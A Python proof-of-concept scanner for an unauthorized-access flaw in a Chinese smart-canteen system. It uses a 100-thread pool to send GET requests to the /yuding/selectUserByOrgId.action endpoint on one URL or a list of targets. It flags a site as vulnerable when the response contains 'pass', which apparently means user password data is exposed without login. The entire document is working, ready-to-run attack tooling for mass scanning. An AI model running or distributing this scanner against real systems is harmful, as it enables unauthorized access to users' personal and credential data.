# 某客宝智慧食堂系统 selectUserByOrgId 未授权访问漏洞
import requests,sys,argparse
from multiprocessing.dummy import Pool

def main():
    parser = argparse.ArgumentParser(description='某客宝智慧食堂系统 selectUserByOrgId 未授权访问漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='please input url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input file')

    args = parser.parse_args()
    url = args.url
    file = args.file
    targets = []

    if args.url:
        check(args.url)
    elif file:
        with open(file, 'r') as f:
            for line in f.readlines():
                line = line.strip()
                if 'http' in line:
                    targets.append(line)
                else:
                    line = f'http://{line}'
                    targets.append(line)
    else:
        print('参数异常')

    pool = Pool(100)
    pool.map(check,targets)

def check(target):
    target = target + '/yuding/selectUserByOrgId.action?record='
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
    response = requests.get(target, headers=headers)
    if response.status_code == 200 and 'pass' in response.text:
        print("漏洞存在" + target)
    else:
        print("漏洞不存在" + target)

if __name__ == '__main__':
    main()